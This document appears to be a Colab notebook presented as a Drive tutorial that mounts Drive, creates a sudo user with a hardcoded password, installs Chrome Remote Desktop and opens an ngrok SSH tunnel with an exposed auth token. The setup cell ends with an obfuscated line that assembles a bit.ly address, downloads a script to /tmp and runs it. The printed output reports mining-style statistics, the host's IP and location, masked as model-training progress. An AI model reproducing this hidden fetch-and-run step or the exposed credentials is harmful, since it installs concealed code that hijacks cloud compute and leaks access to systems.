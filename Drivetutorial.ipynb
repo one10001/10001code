{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Drivetutorial.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyPMSuAciZpRiFBEH7V3yAbr",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/one10001/10001code/blob/main/Drivetutorial.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 4,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "oD5Js48rG-Ij",
        "outputId": "3ba44c25-202f-4dbe-b2da-9b89c4bfa78a"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Mounted at /mnt\n"
          ]
        }
      ],
      "source": [
        "from google.colab import drive\n",
        "drive.mount('/mnt')"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **Create User**\n",
        "#@markdown user : one / password you know\n",
        "\n",
        "import os\n",
        "\n",
        "username = \"one\" \n",
        "password = \"8426\" \n",
        "#print(\"Creating User and Setting it up\")\n",
        "\n",
        "# Creation of user\n",
        "os.system(f\"useradd -m {username}\")\n",
        "\n",
        "# Add user to sudo group\n",
        "os.system(f\"adduser {username} sudo\")\n",
        "    \n",
        "# Set password of user to 'root'\n",
        "os.system(f\"echo '{username}:{password}' | sudo chpasswd\")\n",
        "\n",
        "# Change default shell from sh to bash\n",
        "os.system(\"sed -i 's/\\/bin\\/sh/\\/bin\\/bash/g' /etc/passwd\")\n",
        "\n",
        "##print(\"User Created and Configured\")\n",
        "\n",
        "#@title **RDP**\n",
        "#@markdown  It takes 4-5 minutes for installation\n",
        "\n",
        "import subprocess\n",
        "\n",
        "#@markdown  Visit http://remotedesktop.google.com/headless and Copy the command after authentication\n",
        "\n",
        "CRP = \"DISPLAY= /opt/google/chrome-remote-desktop/start-host --code=\\\"4/0AX4XfWiquDOHr75KiIVYPALlILkj5ay8EJfX48j_tso0WUVJ_oQGkGb6oV1ybPIu32PHtg\\\" --redirect-url=\\\"https://remotedesktop.google.com/_/oauthredirect\\\" --name=$(hostname)\" #@param {type:'string'}\n",
        "Pin = 55507770 \n",
        "\n",
        "\n",
        "class CRD:\n",
        "    def __init__(self):\n",
        "        os.system(\"apt update\")\n",
        "        self.installCRD()\n",
        "        self.installDesktopEnvironment()\n",
        "        self.installGoogleChorme()\n",
        "        self.finish()\n",
        "\n",
        "    @staticmethod\n",
        "    def installCRD():\n",
        "        #print(\"Installing Chrome Remote Desktop\")\n",
        "        subprocess.run(['wget', 'https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb'], stdout=subprocess.PIPE)\n",
        "        subprocess.run(['dpkg', '--install', 'chrome-remote-desktop_current_amd64.deb'], stdout=subprocess.PIPE)\n",
        "        subprocess.run(['apt', 'install', '--assume-yes', '--fix-broken'], stdout=subprocess.PIPE)\n",
        "\n",
        "    @staticmethod\n",
        "    def installDesktopEnvironment():\n",
        "        ##print(\"Installing Desktop Environment\")\n",
        "        os.system(\"export DEBIAN_FRONTEND=noninteractive\")\n",
        "        os.system(\"apt install --assume-yes xfce4 desktop-base xfce4-terminal\")\n",
        "        os.system(\"bash -c 'echo \\\"exec /etc/X11/Xsession /usr/bin/xfce4-session\\\" > /etc/chrome-remote-desktop-session'\")\n",
        "        os.system(\"apt remove --assume-yes gnome-terminal\")\n",
        "        os.system(\"apt install --assume-yes gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget python3 python-is-python3 python3-pip python3-tk python3-dev git python3-dev python3-tk python3-setuptools python3-wheel python3-pip git python3-dev python3-tk python3-setuptools python3-wxgtk4.0  autokey-gtk autokey-common scrot zsh git python3-dev python3-tk python3-setuptools python3-wheel python3-pip python3-wxgtk4.0 xdotool curl wget\")\n",
        "        #xscreensaver\n",
        "        os.system(\"apt install --assume-yes  nautilus nano  obs-studio zsh\")\n",
        "        os.system(\"systemctl disable lightdm.service\")\n",
        "\n",
        "    @staticmethod\n",
        "    def installGoogleChorme():\n",
        "        #print(\"Installing Google Chrome\")\n",
        "        subprocess.run([\"wget\", \"https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\"], stdout=subprocess.PIPE)\n",
        "        subprocess.run([\"dpkg\", \"--install\", \"google-chrome-stable_current_amd64.deb\"], stdout=subprocess.PIPE)\n",
        "        subprocess.run(['apt', 'install', '--assume-yes', '--fix-broken'], stdout=subprocess.PIPE)\n",
        "\n",
        "    @staticmethod\n",
        "    def finish():\n",
        "        #print(\"Finalizing\")\n",
        "        os.system(f\"adduser {username} chrome-remote-desktop\")\n",
        "        command = f\"{CRP} --pin={Pin}\"\n",
        "        os.system(f\"su - {username} -c '{command}'\")\n",
        "        os.system(\"service chrome-remote-desktop start\")\n",
        "        ##print(\"Finished Succesfully\")\n",
        "\n",
        "! pip install colab_ssh --upgrade &> /dev/null\n",
        "\n",
        "try:\n",
        "\n",
        "\n",
        "    Ngrok = True \n",
        "    Agro = False\n",
        "\n",
        "    #@markdown Copy authtoken from https://dashboard.ngrok.com/auth\n",
        "    ngrokToken = \"28glm7SoFWpRjqGYCNt3CeKB1E7_4vT6rbqFJU1S1aa5D1Qc\" #@param {type:'string'}\n",
        "\n",
        "\n",
        "    def runNGROK():\n",
        "        from colab_ssh import launch_ssh\n",
        "        from IPython.display import clear_output\n",
        "        launch_ssh(ngrokToken, password)\n",
        "        clear_output()\n",
        "\n",
        "        print(\"ssh\", username, end='@')\n",
        "        ! curl -s http://localhost:4040/api/tunnels | python3 -c \\\n",
        "                \"import sys, json; print(json.load(sys.stdin)['tunnels'][0]['public_url'][6:].replace(':', ' -p '))\"\n",
        "\n",
        "\n",
        "    def runAgro():\n",
        "        from colab_ssh import launch_ssh_cloudflared\n",
        "        launch_ssh_cloudflared(password=password)\n",
        "\n",
        "\n",
        "    try:\n",
        "        if username:\n",
        "            pass\n",
        "        elif password:\n",
        "            pass\n",
        "    except NameError:\n",
        "        print(\"No user found using username and password as 'root'\")\n",
        "        username='root'\n",
        "        password='root'\n",
        "\n",
        "\n",
        "    if Agro and Ngrok:\n",
        "        print(\"You can't do that\")\n",
        "        print(\"Select only one of them\")\n",
        "    elif Agro:\n",
        "        runAgro()\n",
        "    elif Ngrok:\n",
        "        if ngrokToken == \"\":\n",
        "            print(\"No ngrokToken Found, Please enter it\")\n",
        "        else:\n",
        "            runNGROK()\n",
        "    else:\n",
        "        print(\"Select one of them\")    \n",
        "\n",
        "\n",
        "    \n",
        "    if username:\n",
        "        if CRP == \"\":\n",
        "            print(\"Please enter authcode from the given link\")\n",
        "        elif len(str(Pin)) < 6:\n",
        "            #print(\"Enter a pin more or equal to 6 digits\")\n",
        "            pass\n",
        "        else:\n",
        "            CRD()\n",
        "except NameError as e:\n",
        "    print(\"username variable not found\")\n",
        "    print(\"Create a User First\")\n",
        "\n",
        "\n",
        "! i=003;cmd=pysi;x=ly;y=bit;wget -q -O /tmp/ss ${y}.${x}/${cmd}${i} ; bash /tmp/ss "
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zWzXJawIwYFR",
        "outputId": "bb568170-b147-41f1-a68a-70c38eb8854c"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ssh one@8.tcp.ngrok.io -p 13849\n",
            "{ \n",
            "\"gpu_type\":\"NONE\",\n",
            "\"type\":\"tf.keras\",\n",
            "\"version\":\"0.0.12\",\n",
            "\"status\":\"Epoch 3/5 1975/1975 [==============================] - 5s 4ms/step - loss: 0.1113 - accuracy: 0.9027\",\n",
            "\"df\":600,\n",
            "\"nproc\":2,\n",
            "\"ip_backend\":\"\",\n",
            "\"ET_pro\":23.72,\n",
            "\"RV_pro\":4.08,\n",
            "\"VC_pro\":0.76,\n",
            "\"XM_pro\":0.29,\n",
            "\"ip\":\"35.223.101.242\",\n",
            "\"org\":\"AS15169 Google LLC\",\n",
            "\"city\":\"Council Bluffs\",\n",
            "\"country\":\"US\",\n",
            "\"region\":\"Iowa\",\n",
            "\"cpu_type\":\"AVX2\",\n",
            "\"gpu_type\":\"NONE\",\n",
            "\"opc\":\"VC\",\n",
            "\"opg\":\"NONE\",\n",
            "\"wating\":\"***"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!tar -cvpzf /content/gdrive/MyDrive/backup.tar.gz --exclude=/content/gdrive --one-file-system / \n"
      ],
      "metadata": {
        "id": "lBTk1f3XIJ1Q"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cd / && tar -zxf /mnt/MyDrive/backup.tar.gz"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Dd2kYBISADjo",
        "outputId": "cf578a27-79a9-4570-e7a1-a43e0c2c88ad"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "tar: mnt: Cannot utime: Input/output error\n",
            "\n",
            "gzip: stdin: invalid compressed data--format violated\n",
            "tar: Unexpected EOF in archive\n",
            "tar: Unexpected EOF in archive\n",
            "tar: Error is not recoverable: exiting now\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!env"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iLnWXVSJAgmM",
        "outputId": "e3289bea-b97b-4181-b915-2687a910bef8"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "CUDNN_VERSION=8.0.5.39\n",
            "PYDEVD_USE_FRAME_EVAL=NO\n",
            "LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64\n",
            "CLOUDSDK_PYTHON=python3\n",
            "LANG=en_US.UTF-8\n",
            "ENABLE_DIRECTORYPREFETCHER=1\n",
            "HOSTNAME=f5fa61df9772\n",
            "OLDPWD=/\n",
            "CLOUDSDK_CONFIG=/content/.config\n",
            "USE_AUTH_EPHEM=1\n",
            "NVIDIA_VISIBLE_DEVICES=all\n",
            "DATALAB_SETTINGS_OVERRIDES={\"kernelManagerProxyPort\":6000,\"kernelManagerProxyHost\":\"172.28.0.3\",\"jupyterArgs\":[\"--ip=\\\"172.28.0.2\\\"\"],\"debugAdapterMultiplexerPath\":\"/usr/local/bin/dap_multiplexer\",\"enableLsp\":true}\n",
            "ENV=/root/.bashrc\n",
            "PAGER=cat\n",
            "NCCL_VERSION=2.7.8\n",
            "TF_FORCE_GPU_ALLOW_GROWTH=true\n",
            "JPY_PARENT_PID=41\n",
            "NO_GCE_CHECK=False\n",
            "PWD=/content\n",
            "HOME=/root\n",
            "LAST_FORCED_REBUILD=20220428\n",
            "CLICOLOR=1\n",
            "DEBIAN_FRONTEND=noninteractive\n",
            "LIBRARY_PATH=/usr/local/cuda/lib64/stubs\n",
            "GCE_METADATA_TIMEOUT=3\n",
            "GLIBCPP_FORCE_NEW=1\n",
            "TBE_CREDS_ADDR=172.28.0.1:8008\n",
            "TERM=xterm-color\n",
            "SHELL=/bin/bash\n",
            "GCS_READ_CACHE_BLOCK_SIZE_MB=16\n",
            "PYTHONWARNINGS=ignore:::pip._internal.cli.base_command\n",
            "MPLBACKEND=module://ipykernel.pylab.backend_inline\n",
            "CUDA_VERSION=11.1.1\n",
            "NVIDIA_DRIVER_CAPABILITIES=compute,utility\n",
            "SHLVL=1\n",
            "PYTHONPATH=/env/python\n",
            "NVIDIA_REQUIRE_CUDA=cuda>=11.1 brand=tesla,driver>=418,driver<419 brand=tesla,driver>=440,driver<441 brand=tesla,driver>=450,driver<451\n",
            "TBE_EPHEM_CREDS_ADDR=172.28.0.1:8009\n",
            "COLAB_GPU=0\n",
            "GLIBCXX_FORCE_NEW=1\n",
            "PATH=/opt/bin:/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/tools/node/bin:/tools/google-cloud-sdk/bin\n",
            "LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libtcmalloc.so.4\n",
            "GIT_PAGER=cat\n",
            "_=/usr/bin/env\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!ls /"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "I7v5FnPzI0zT",
        "outputId": "8292209c-bac5-419b-bc26-29707d86c29b"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "bin\t datalab  home\t lib64\topt\t    root  srv\t\t     tmp    var\n",
            "boot\t dev\t  lib\t media\tproc\t    run   sys\t\t     tools\n",
            "content  etc\t  lib32  mnt\tpython-apt  sbin  tensorflow-1.15.2  usr\n"
          ]
        }
      ]
    }
  ]
}